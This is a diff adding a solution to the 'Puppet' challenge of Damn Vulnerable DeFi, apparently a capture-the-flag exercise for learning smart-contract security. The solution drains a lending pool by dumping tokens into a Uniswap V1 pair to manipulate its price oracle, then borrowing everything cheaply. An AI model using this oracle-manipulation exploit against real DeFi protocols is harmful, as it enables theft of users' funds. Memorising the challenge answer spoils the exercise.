@@ -91,11 +91,19 @@ contract PuppetChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppet() public checkSolvedByPlayer {
-        
+    function test_puppet() public 
+    checkSolvedByPlayer 
+    {
+        // deploy Interacter and transfer player's DVT to make the swap
+        Interacter interacter = new Interacter(uniswapV1Exchange, token);
+        token.transfer(address(interacter), token.balanceOf(player)); 
+        // swap tokens to manipulate the prices 
+        interacter.swapDVTForETH();
+        // recover funds 
+        lendingPool.borrow{ value:player.balance }(token.balanceOf(address(lendingPool)), recovery);
     }
 
-    // Utility function to calculate Uniswap prices
+    // Utility function to calculate Uniswap prices -> X ether/token (considers comission)
     function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
         private
         pure
@@ -115,4 +123,22 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract Interacter {
+    IUniswapV1Exchange uniswapV1Exchange;
+    DamnValuableToken token;
+    constructor(IUniswapV1Exchange _uni, DamnValuableToken _token) {
+        uniswapV1Exchange = _uni;
+        token = _token;
+    }
+
+    // @dev this function swaps all the DVT balance of this contract for ETH
+    function swapDVTForETH() public {
+        token.approve(address(uniswapV1Exchange), token.balanceOf(address(this)));
+        uniswapV1Exchange.tokenToEthSwapInput(token.balanceOf(address(this)), 1, block.timestamp + 1 days ); // uint256 tokens_sold, uint256 min_eth, uint256 deadline
+    }
+    
+    // @dev needed to receive the eth from the swap
+    receive() external payable {}
 }
